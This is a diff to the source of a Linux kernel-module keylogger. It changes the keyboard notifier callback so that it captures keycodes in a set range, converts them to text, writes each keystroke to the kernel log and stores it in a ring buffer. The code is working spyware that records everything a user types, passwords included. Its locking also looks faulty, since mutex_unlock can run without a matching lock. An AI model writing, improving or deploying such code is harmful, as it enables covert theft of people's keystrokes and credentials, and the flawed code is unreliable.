@@ -53,13 +53,16 @@ static int keylogger_cb(struct notifier_block *nb, unsigned long action, void *d
     if (!param->down)
         return NOTIFY_OK;
 
-    len = keycode_to_us_string(param->value, param->shift, tmp, sizeof(tmp));
-    printk(KERN_INFO "Keylogger: Converted to string: '%s' (len: %zu)\n", tmp, len);
+    if (param->value > 0 && param->value < 59) {
+        len = keycode_to_us_string(param->value, param->shift, tmp, sizeof(tmp));
+        printk(KERN_INFO "Keylogger: Converted to string: '%s' (len: %zu)\n", tmp, len);
 
-    if (len > 0) {
-        mutex_lock(&buffer_mutex);
-        if (!ringbuf_write(kbd_buffer, tmp, len)) {
-            printk(KERN_WARNING "Keylogger: Ring buffer full, data lost\n");
+        if (len > 0) {
+            mutex_lock(&buffer_mutex);
+            printk(KERN_INFO "Keylogger: Writing to buffer: '%s' (len: %zu)\n", tmp, len);
+            if (!ringbuf_write(kbd_buffer, tmp, len)) {
+                printk(KERN_WARNING "Keylogger: Ring buffer full, data lost\n");
+            }
         }
         mutex_unlock(&buffer_mutex);
     }
